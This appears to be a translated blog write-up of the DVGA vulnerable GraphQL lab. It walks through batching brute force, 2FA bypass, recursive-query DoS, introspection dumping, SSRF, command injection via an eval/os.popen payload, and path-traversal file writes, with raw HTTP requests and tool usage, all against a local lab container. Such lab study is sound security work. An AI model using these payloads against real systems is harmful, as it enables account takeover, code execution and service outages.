---
title: "Attacking GraphQL — Learning GraphQL Security from the DVGA Range"
slug: ps5n3g
translationKey: ps5n3g
date: 2021-04-28T17:29:00+08:00
source: yuque/penetration
---

# 0x00 Background
First, an introduction: what is GraphQL? Just refer to this article

> See:[https://zhuanlan.zhihu.com/p/124019191](https://zhuanlan.zhihu.com/p/124019191)、
>

<font style="color:rgb(18, 18, 18);">The client first interacts with GraphQL, which in turn interacts with arbitrary code, and finally ends the conversation with the database. The diagram describing this situation is:</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619602167147-21303751-5952-44c2-90ef-34cef79ca79f.png)

<font style="color:rgb(18, 18, 18);">This architectural change brings many advantages, for example:</font>

1. <font style="color:rgb(18, 18, 18);">All the data the client needs can be obtained in a single request (whereas a REST API requires multiple requests)</font>
2. <font style="color:rgb(18, 18, 18);">A single Endpoint (URL) can handle multiple kinds of requests.</font>



## Introspection
> Introspection allows us to get information about all the Requests, Mutations, Subscriptions, and Data Types and all other things that are made available to the clients making requestsThis information is easily available by requesting `___schema` meta-field, which, according to the specification, is always available to the query of the “root” type.
>
> GraphQL uses its Introspection to allow obtaining information about the types, fields, mutations, etc. of the queries available on the server. This information can be easily obtained by requesting the `___schema` meta-field, which, according to the specification, is always available to queries of the “`root`” type.
>
> See: [https://graphql.org/learn/introspection/](https://graphql.org/learn/introspection/)、
>

What problems does the introspection mechanism bring?

First, not all implementations follow the specification. As shown [here](https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/), it is possible to disable GraphQL introspection, but many implementations simply do not have the capability to turn introspection off.

Second, there is information disclosure — introspection introduces information-leakage issues, which will be covered later.

## About the Range
This GraphQL range is called DVGA (Damn-Vulnerable-GraphQL-Application), a project written in Django

What I used here is of course the docker installation (safety first)

```markdown
# Pull the docker image from Docker Hub
docker pull dolevf/dvga

# Create a container from the image
docker run -t -p 80:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
```

Below are my notes on the range [https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)

---

# 0x01 DoS Attacks
Below are three attack scenarios

## (1) Batching Attacks
Batching Attacks

> <font style="color:rgba(0, 0, 0, 0.74);">See：</font>[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)
>
> <font style="color:rgba(0, 0, 0, 0.74);">One of these documented but not commonly used behaviors is the ability to send multiple queries with a single GraphQL request,</font>[a.k.a. batching](https://blog.apollographql.com/batching-client-graphql-queries-a685f5bcd41b)<font style="color:rgba(0, 0, 0, 0.74);">—something never explored by security researchers before.  We will call attempts to explore this behavior</font>_**<font style="color:rgba(0, 0, 0, 0.74);">“GraphQL Batching Attacks”</font>**_<font style="color:rgba(0, 0, 0, 0.74);">.</font>
>
> One of these documented but rarely used behaviors is the ability to send multiple queries in a single GraphQL request (i.e. batching / batched queries) — a capability never explored by security researchers before. We call attempts to exploit this behavior “GraphQL Batching Attacks”.
>

Definition

> <font style="color:rgba(0, 0, 0, 0.74);">See：</font>[https://graphql.org/learn/best-practices/#server-side-batching-caching](https://graphql.org/learn/best-practices/#server-side-batching-caching)
>
> GraphQL is designed in a way that allows you to write clean code on the server, where every field on every type has a focused single-purpose function for resolving that value. However, without additional consideration, a naive GraphQL service could be very “chatty” or repeatedly load data from your databases.
>
> This is commonly solved by a batching technique, where multiple requests for data from a backend are collected over a short period of time and then dispatched in a single request to an underlying database or microservice by using a tool like Facebook’s DataLoader.
>
>
> GraphQL is designed in a way that lets you write clean code on the server, where every field on every type has a focused single-purpose function for resolving that value. However, without additional consideration, a naive GraphQL service could be very “chatty” and repeatedly load data from your databases.
>
>
> This is commonly solved with a batching technique, which collects multiple data requests to the backend over a short period of time and then dispatches them in a single request to the underlying database or microservice using a tool like Facebook’s DataLoader.
>

Key point: multiple queries, sent at once.

`Batching` can be implemented in roughly three ways; the full details are covered in the article [https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/](https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/) — here we focus on **Transport-level batching**

In most GraphQL servers, requests are sent in the following form:

```http
{
  "query": “< query string goes here >”,
  "variables": {
    <variable values go here>
  }
}
```

The GraphQL server then parses the query string and returns a single result.

Instead, suppose we submit a request that looks like this:

```http
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

The server will return a response like this:

```http
[
  <result for query 0>,
  <result for query 1>,
  ...
  <result for query n>
]
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664293829-241647d2-ba92-4329-b4b8-21f13b6380e5.png)

**Security Risks**

It is mainly used for **bypassing limits and abusing rates**

First, testing operations paired with user authentication must enforce a limit on the number of attempts. If a single API call can request 10000 attempts at entering a password, 2FA token, and so on, how do you limit the number of attempts? (Note: presumably GraphQL itself has no ability to limit request counts) Clearly, this check has to happen at the code level, and it is up to developers to validate that many such attempts. This is a perfect place for errors and inconsistencies to creep in. According to Murphy’s law — “anything that can go wrong will go wrong”.

Second, for tools responsible for protecting web applications (such as WAFs and RASP), identifying abnormal server activity is a challenge when every API request can encapsulate thousands of malicious requests that make up an attack.

For anyone already well versed in application security, an easy way to understand this attack vector is to compare it with the [XMLRPC Bruteforce Amplification](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/#brute-force-attacks) that plagued WordPress for years. Batching attacks are very similar, but with GraphQL it goes even further.

### Password Bruteforce
Authenticate through the GraphQL API while sending many queries with different credentials to check them. This is a classic brute-force attack, but thanks to GraphQL batching, **each HTTP request can now carry multiple login/password pairs**. This approach makes external rate-monitoring applications believe everything is fine, and they will not notice a brute-force attack guessing passwords.

Below you can find the simplest demonstration of an application authentication request, with 3 different email/password pairs at once. Obviously, thousands of them could be sent in a single request the same way:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619663761156-8f66cbfe-c854-4bc0-b968-f388ee4e425b.png)

As can be seen from the response screenshot, the first and third requests return null with the corresponding message reflected in the errors section. The second request carries the correct authentication data, and the response contains a valid authentication session token.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619663785632-717036c4-a24e-45e2-8fe4-67c945dd76b5.png)

In short, GraphQL allows us to send multiple mutation requests to obtain the application’s session authentication and make many attempts to guess the correct password.

```http
POST /graphql HTTP/1.1
Host: dvga
Content-Length: 101
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36
Content-Type: application/json
Origin: http://dvga
Referer: http://dvga/my_pastes
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJkaWZmaWN1bHR5IjoiZWFzeSJ9.YKTdFg.gxo7zovzYI-WIWb3kior9oodnw8; env=Z3JhcGhpcWw6ZGlzYWJsZQ==
Connection: close

{"query":"query {      systemDiagnostics(username:\"admin\", password:\"letmein\", cmd:\"id\")    }"}
```

Brute-force it, and the password is revealed.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478523995-f11cda82-1f57-4138-a12c-7d8b892697e7.png)

### 2FA Bypass
While application authentication is handled by GraphQL, implementing two-factor authentication (2FA) is not uncommon. With GraphQL batching attacks, OTP (one-time password) — one of the most common second authentication factors — can be bypassed entirely by sending all token variants in a single request.

You can find an example of this GraphQL request below:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664130648-087cfc33-91ac-410f-bbd2-f08b0d054e87.png)

The response screenshot shows three attempts to enter the OTP within a single response request. The correct code is carried only in the third mutation, while the first and second mutations both return null with the corresponding message reflected in the errors section

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664141505-889e1d77-a15d-41c9-95a4-430a7f2a3c26.png)

Note that the vulnerable GraphQL web application processed all 3 “one-time” tokens simultaneously, found the valid one, and logged us into the interior.

---

## (2) Resource Intensive Query Attack
Resource Intensive Query Attack

Take an example from the vulnerable range [Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/issues): by sending multiple `systemUpdate` queries, the server is made to

```http
[
    {"query":"query {\n  systemUpdate\n}","variables":[]},
    {"query":"query {\n  systemUpdate\n}","variables":[]},
    {"query":"query {\n  systemUpdate\n}","variables":[]}
    ]
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619664410785-181e9856-c663-46b7-9265-513382bb1ef8.png)

---

## (3) Deep Recursion Query Attack
Deep Recursion Query Attack

> In GraphQL, when types reference one another, it is usually possible to build a cyclic query that grows exponentially to the point of crippling the server. Countermeasures such as `max_depth` can help mitigate these types of attacks.
>

Using the following body in a GraphQL call, you can increase the number of nesting levels indefinitely, each time getting an exponentially larger response.

```http
query allSchemaTypes {  
    __schema {  
        types {  
            fields {  
                type{  
                    fields {  
                        type {  
                            fields {  
                                type {  
                                    fields {  
                                        name  
                                    }  
                                }  
                            }  
                        }  
                    }  
                }  
            }  
        }  
    }  
}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619680010813-39ceac6e-c486-4fec-b915-0159b54bfac5.png)

If you add even more nesting levels, the server crashes outright [be careful]

```http
query allSchemaTypes { __schema { types { fields { type{ fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { type { fields { name } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } } 
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619680246287-cb0d6468-3f67-4364-b2cb-e736a978d594.png)

The logs at this point

[Log_DoS_GraphQL.txt](https://www.yuque.com/attachments/yuque/0/2021/txt/166008/1619681257396-4cb77c1c-5f32-49d0-bbe6-cfb51114ec86.txt)

---



## (4) Remediation
For remediation of **recursive queries**, developers can refer to: [https://gitlab.com/gitlab-org/gitlab/-/issues/30096](https://gitlab.com/gitlab-org/gitlab/-/issues/30096). The recommendations are basically as follows:

+ Turn off introspective queries in production
+ You can rate limit on depth (levels of nesting), on complexity, on query size and so on — this kind of limiting needs to be properly designed at the code level. Consider adding a depth limit, using the `graphql-depth-limit` module to limit query counts; or use `graphql-input-number` to create a scalar with a maximum of 100

# 0x02 Information Disclosure
## Information Disclosure
> GraphQL introspection is a special query that queries GraphQL for its schema using the __schema field.
>
> Introspection itself is not a weakness but a feature. However, if it is exposed, an attacker may use and abuse it to seek out information about the GraphQL implementation, such as which queries or mutations exist.
>

First, execute the following query

```basic
{"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
```

Paste the returned response into [https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620381958074-b65cb9bc-f1f9-4133-8374-39e4cbfa2efe.png)

## GraphQL Field Suggestions
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621417669014-b79196f7-0cf9-4531-9371-276577109b80.png)



# 0x03 Feature Abuse
## (1) SSRF
The feature point is shown in the figure:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621417951734-1f2dc330-063c-4fe0-8f7d-6200f1a148ec.png)

Capturing the traffic, using the `gopher` or `dict` protocol, SSRF can be achieved either way

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621417924694-97ef1804-6d31-4f4c-aaf4-8c05f6d99867.png)



## (2) Command Injection
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478987191-5a520119-cb1c-484e-97f9-60d6bec89ae5.png)

> See：[https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
>



In fact, according to the code [https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/614a19549b25dc8fc0edfa2cd0cabe613422c0bb/core/views.py#L130](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/614a19549b25dc8fc0edfa2cd0cabe613422c0bb/core/views.py#L130)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621419111418-633142bb-8f4a-41fa-8777-0d55e612310c.png)

First, considering `f-strings`, you could originally have used

```basic
>>> f'''{eval(compile("__import__('os').popen('pwd').read()", '', 'single'))}'''
'/c/cmder_c\n'
'None'
```

to achieve command injection.

But since the content cannot be fully controlled, it is better to just go with `os-cmd injection`, which kills at will

```basic
``
||
;;
&&
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621420024526-b5bfe204-54ae-4a50-9f28-dd215fc03810.png)

## (3) XSS
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478970438-c704a226-54cc-48de-affc-d561dff7e7b3.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478336356-ab38a541-f4cc-447e-aa6e-cb08882e48a1.png)

## (4) Arbitrary File Read
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478954652-8fcf4d41-57f1-484a-80f2-3d379e1110e6.png)

```http
POST /graphql HTTP/1.1
Host: dvga
Content-Length: 269
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36
Content-Type: application/json
Origin: http://dvga
Referer: http://dvga/upload_paste
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJkaWZmaWN1bHR5IjoiZWFzeSJ9.YKTdFg.gxo7zovzYI-WIWb3kior9oodnw8; env=Z3JhcGhpcWw6ZGlzYWJsZQ==
Connection: close

{"query":"mutation UploadPaste ($filename: String!, $content: String!) {\n          uploadPaste(filename: $filename, content:$content)\n          {\n            result\n          }\n        }","variables":{"content":"FILE_content","filename":"../../../../tmp/111.txt"}}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621478929628-56422392-f69f-4014-b939-2533e8f9316f.png)



# 0x04 Exploitation Tools
## inql
[https://github.com/doyensec/inql](https://github.com/doyensec/inql)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1619680782137-46c08552-fd73-4199-bba6-c9cdfd57f8b6.png)

After cloning it locally, just open the bin directory; it will generate inql’s organized results in the current directory, as shown in the figure

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479144151-bc7e8273-275a-4ce3-a939-37031778ca8b.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479303169-18a07bdb-8293-4e5d-821f-5f5fc9de28ab.png)



Note: this tool does not support non-80 ports well; the source code needs to be modified.

## GraphiQL Query Result Visualization
[https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479350060-4e992b88-d007-482b-8062-9a0ffd959309.png)

② Paste the query syntax into GraphiQL’s console and get the query result, ③ then paste the result back into the text box in the figure above. This yields the data structure shown in the figure below (PS: for some reason, it sometimes fails)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621479606860-8365e44a-0075-4178-ad18-9538ff6c5ab4.png)

Find the entity you are interested in, locate its query syntax under the Query directory generated by inql, construct the query parameters, and run the query. For example, for this query syntax (it has been converted, since the original query is not convenient for visualization)

```markdown
{"query": "query {
paste(pId:\"code\") {
	id
	title
	content
	public
	userAgent
	ipAddr
	ownerId
	burn
	pId
	owner {
		id
	}
	Owner {
		id
	}
}}"}
```

Querying directly of course yields no result, as shown below

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621480248982-2bba73ff-76e6-415e-9cae-5949bd43fac0.png)

Change `pId` to a numeric value, such as `1`, and you can see the result returned.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621480302521-d7e1831e-e0b6-45f7-9962-9b929c3a0a12.png)

More often, we first need to obtain some basic information from simple interfaces (such as configuration values like `hash`, `key`, etc.) before we can effectively construct the parameters.

## nmap
Someone in the community wrote a Lua script for targeted exploitation, which you can view at the link below,

See: [https://raw.githubusercontent.com/dolevf/nmap-graphql-introspection-nse/6594cce7b590a7194641494ed33c018d9ecd6b89/graphql-introspection.nse](https://raw.githubusercontent.com/dolevf/nmap-graphql-introspection-nse/6594cce7b590a7194641494ed33c018d9ecd6b89/graphql-introspection.nse)

Before use, place it under the `scripts/` directory of your nmap installation. The usage process is as follows:

```http
λ nmap -sV dvga --script=graphql-introspection -p 80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 18:42 ?D1ú±ê×?ê±??
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 12.50% done; ETC: 18:42 (0:00:00 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for dvga (127.0.0.1:)
Host is up (0.031s latency).
rDNS record for 127.0.0.1: DVGA

PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.9)
| graphql-introspection:
|   VULNERABLE:
|   GraphQL Server allows Introspection queries at endpoint: Endpoint: /graphql is vulnerable to introspection queries!
|     State: VULNERABLE
|       Checks if GraphQL allows Introspection Queries.
|
|     References:
|_      https://graphql.org/learn/introspection/
|_http-server-header: Werkzeug/1.0.1 Python/3.7.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds

```



# Refs
+ [https://www.apollographql.com/blog/batching-client-graphql-queries-a685f5bcd41b/](https://www.apollographql.com/blog/batching-client-graphql-queries-a685f5bcd41b/)

[https://graphql.org/learn/introspection](https://graphql.org/learn/introspection/)

+ [https://blog.doyensec.com/2018/05/17/graphql-security-overview.html](https://blog.doyensec.com/2018/05/17/graphql-security-overview.html)
+ [https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/](https://www.apollographql.com/blog/query-batching-in-apollo-63acfd859862/)
+ [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)
+ [https://zhuanlan.zhihu.com/p/124019191](https://zhuanlan.zhihu.com/p/124019191)
+ [https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)
+  [Mastering GraphQL](https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ)
+ [https://github.com/doyensec/inql](https://github.com/doyensec/inql) (installation is prone to problems; the directory behaves abnormally when not on the default port)


